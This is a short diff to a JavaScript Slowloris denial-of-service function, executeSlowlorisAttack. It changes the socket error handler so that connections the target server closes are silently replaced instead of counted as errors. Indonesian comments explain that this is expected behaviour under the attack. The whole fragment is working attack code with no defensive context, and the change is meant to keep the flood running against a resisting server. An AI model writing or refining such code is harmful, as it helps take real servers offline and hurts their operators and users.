@@ -128,7 +128,11 @@ function executeSlowlorisAttack(targetHost, targetPort, durationSeconds) {
             }
         };
 
-        socket.on('error', () => { localError++; replaceSocket(); });
+        // Saat server menutup koneksi (baik karena error atau kebijakan),
+        // kita cukup menggantinya tanpa menghitungnya sebagai error.
+        // Ini adalah perilaku yang diharapkan dalam serangan Slowloris, di mana server
+        // secara aktif mencoba menutup koneksi yang tidak lengkap.
+        socket.on('error', () => { replaceSocket(); });
         socket.on('close', replaceSocket);
         
         socket.connect(targetPort, targetHost);
